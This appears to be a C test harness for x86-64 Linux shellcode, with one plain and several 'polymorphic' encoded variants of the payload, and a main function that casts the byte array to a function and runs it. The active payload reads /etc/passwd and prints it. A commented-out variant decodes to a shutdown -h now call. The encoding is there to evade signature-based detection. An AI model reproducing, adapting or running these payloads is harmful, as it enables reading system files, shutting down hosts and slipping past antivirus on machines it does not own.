#include<stdio.h>
#include<string.h>


unsigned char shellcode[] =
//non poly
"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41"
;

unsigned char shellcode_poly[] =
//poly
//"\x48\x31\xc0\x99\x50\x66\xb8\x2d\x68\x66\x50\x48\x31\xc0\x54\x59\x50\x6a\x77\x66\x68\x6e\x6f\x54\x5b\x50\x53\x51\x54\x5e\x50\xeb\x15\x5f\x48\x31\xc9\x48\x83\xc1\x0f\x80\x04\x0f\x02\xe2\xfa\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xe6\xff\xff\xff\x2f\x2d\x2d\x71\x60\x67\x6c\x2d\x71\x66\x73\x72\x62\x6d\x75\x6c"
//"\xeb\x38\x5f\x80\x6f\x0b\x41\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x66\x6a\xff\x5a\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xc3\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41"
"\xeb\x36\x5f\x80\x6f\x0b\x41\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x66\x6a\xff\x5a\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xc5\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41"

;


main()
{
	printf("Shellcode Length: %d\n", (int)strlen(shellcode));
	printf("Shellcode Poly Length: %d\n", (int)strlen(shellcode_poly));


//	int (*ret)() = (int(*)())shellcode;
	int (*ret)() = (int(*)())shellcode_poly;
	ret();
}
